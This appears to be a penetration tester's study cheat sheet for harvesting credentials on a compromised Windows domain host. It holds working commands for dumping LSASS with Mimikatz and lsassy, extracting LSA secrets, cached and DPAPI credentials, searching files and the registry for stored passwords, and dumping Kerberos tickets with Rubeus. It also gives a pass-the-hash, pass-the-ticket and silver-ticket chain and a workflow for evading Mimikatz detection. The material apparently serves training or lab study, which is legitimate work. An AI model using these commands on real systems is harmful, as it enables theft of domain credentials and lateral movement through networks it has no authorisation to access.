```
# ── Windows MS01, once you have local admin/SYSTEM ──────────

# 1. LSASS — catches ANY domain user who's ever logged in interactively
#    (RDP'd admins, service techs) — often your highest-value loot:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Remote/no-mimikatz version:
nxc smb 192.168.x.101 -u localadmin -p 'Password123' -M lsassy
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# 2. LSA secrets — service account & scheduled-task passwords stored in plaintext-reversible form:
mimikatz # lsadump::secrets

# 3. Cached domain creds (mscache v2) — useful if this box was ever offline from the DC:
mimikatz # lsadump::cache
# Crack offline: hashcat -m 2100 mscache.txt rockyou.txt

# 4. DPAPI-protected secrets — saved browser/RDP/WiFi passwords:
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::cred /in:"C:\Users\victim\AppData\...\Credentials\" /masterkey:

# 5. Search the filesystem for creds admins forget about:
dir /s *unattend.xml *sysprep.inf *sysprep.xml 2>nul
dir /s *.rdg *.kdbx 2>nul                          # RDCMan / KeePass files
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "password connectionstring"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # saved PuTTY sessions
findstr /si password *.txt *.ini *.config *.xml 2>nul

# 6. Services/scheduled tasks running AS a domain account (their creds are often in Group Managed / stored):
sc.exe qc <servicename>                            # look for "SERVICE_START_NAME"
schtasks /query /fo LIST /v | findstr /i "task to run\|run as user"

# 7. Kerberos tickets already cached in memory — if a DA logged into MS01 recently, their TGT may still be here:
klist
Rubeus.exe triage
Rubeus.exe dump /nowrap
```

# ── Chapter 22: LSASS authentication context ────────────────

# LSASS stores reusable AD authentication material for SSO/ticket renewal.
# Local Administrator/SYSTEM is normally required to read another user's cached material.

# Credential material:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Kerberos tickets:
mimikatz # sekurlsa::tickets
klist
Rubeus.exe triage
Rubeus.exe dump /nowrap

# Mental model:
# TGT  → can request additional service tickets for resources the user can access.
# TGS  → normally usable only for its specific SPN/service/resource.

# High-value chain:
# local admin/SYSTEM
#   → dump LSASS
#   ├─ NTLM hash      → crack / Pass-the-Hash
#   ├─ TGT/TGS        → Pass-the-Ticket
#   └─ service hash   → possible Silver Ticket for that SPN

# Chapter 22 notes that direct Mimikatz use is commonly detected.
# Alternative workflow: dump LSASS memory, transfer dump, analyze offline.
```

See [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication — NTLM, Kerberos & LSASS]].
